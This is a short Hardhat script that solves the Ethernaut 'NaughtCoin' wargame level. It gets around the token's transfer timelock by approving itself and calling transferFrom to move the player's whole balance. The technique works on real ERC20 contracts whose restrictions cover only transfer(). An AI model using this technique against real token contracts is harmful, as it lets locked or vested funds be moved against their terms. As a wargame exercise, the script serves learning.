const { ethers } = require("hardhat");
const Runner = require("./lib/runner");


Runner.run(async (owner) => { 
    
    //PLACE NAUGHTCOIN CONTRACT ADDRESS HERE (Ethernaut: contract.address)
    const contractAddr = "0x7e701565AFC1213C59EF83e6D98FBC444F9f73f4"; 
    
    //get contracts 
    const token = await ethers.getContractAt("NaughtCoin", contractAddr); 
    const balance = await token.balanceOf(owner.address);
    
    console.log("* * * ");
    console.log(`player has ${balance} NaughtCoin tokens`);
    
    //approve/transfer from player to token 
    console.log("transferring...");
    await token.approve(owner.address, balance, {gasLimit:100000});
    await token.transferFrom(owner.address, token.address, balance, {gasLimit:100000});
    
    //verify that player has no tokens left 
    console.log(`player has ${await token.balanceOf(owner.address)} NaughtCoin tokens`);
    
    console.log("* * * ");
});
